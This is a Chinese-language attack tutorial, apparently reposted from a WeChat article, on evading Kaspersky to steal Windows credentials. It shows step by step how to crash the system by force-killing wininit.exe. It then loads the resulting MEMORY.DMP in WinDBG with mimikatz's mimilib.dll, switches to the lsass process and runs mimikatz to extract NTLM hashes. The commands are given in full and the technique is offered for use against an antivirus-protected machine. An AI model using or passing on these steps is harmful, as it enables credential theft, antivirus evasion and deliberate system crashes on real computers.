# 通过Windows蓝屏文件来绕过kaspersky的内存保护抓密码

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzk0NjE0NDc5OQ==&mid=2247498616&idx=2&sn=cdc609eedd0d22e9b4fb15bf2266741a&chksm=c3082808f47fa11e4f5fe64ffb601ec0d558597625e32e65c77fe9b941b7f95d6e0d1832d3e1&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=Mzk0NjE0NDc5OQ==&mid=2247498616&idx=2&sn=cdc609eedd0d22e9b4fb15bf2266741a&chksm=c3082808f47fa11e4f5fe64ffb601ec0d558597625e32e65c77fe9b941b7f95d6e0d1832d3e1&scene=27#wechat_redirect)

需要的工具：WinDBG+mimilib.dll  
测试环境一：win8.1  
kaspersky2019(病毒库为2018.10.25号的)

![](../Images/3908244729892fab6aa49c75db47410c.png)1、首先我用procdump来dump lsass.exe的内存文件![](../Images/867cc5389284cb14161d94aa7b1544cc.png)2、再用我在https://www.t00ls.net/thread-47663-1-1.html中分享的用sqldump来dump，结局都一样，因为sqldump和procdump的原理都一样![](../Images/8ab3479cd2f8fe345c846e4da1fb62e1.png)下面我们就用Windows蓝屏memory.dmp文件来测试  
3、获取蓝屏后的dmp文件,使系统蓝屏的方法有很多，比如说强制结束系统进程，我这里选择强制结束系统进程wininit.exe  
管理员权限运行cmd后,执行taskkill /f /im "wininit.exe"![](../Images/a1c146671ec7faf35c76d753ef0feec6.png)4、取回存在于C:\\Windows\\文件夹下面的MEMORY.DMP文件![](../Images/95833ff48085b3924515e647c642c7ca.png)5、运行windbg,使用Open the crashdump加载MEMORY.DMP![](../Images/c07fe4b8feac3c70c999f18c017a1157.png)6、加载mimikatz的mimilib.dll  
.load C:\\Users\\Administrator\\Desktop\\qqq\\mimilib.dll注意load 前面那个点别漏掉![](../Images/8168945efa8b45c634efffcd2f5c1867.png)7、设置微软符号服务器（这一步在测试中可有可无）  
.SymFix  
8、重新加载  
.Reload  
9、查看lsass.exe进程的内存地址  
!process 0 0 lsass.exe  
10、切换到lsass.exe进程中  
.process /r /p fffffa800e069b00![](../Images/e9db68ffbf6fe62c493d1ad4ad6fcf54.png)11、运行mimikatz  
!mimikatz

![](../Images/fd3923f53133c2a2ea3843c3b06786d0.png)

\=======================  
到此装有kaspersky测试机器win8.1的ntml hash 就成功获得
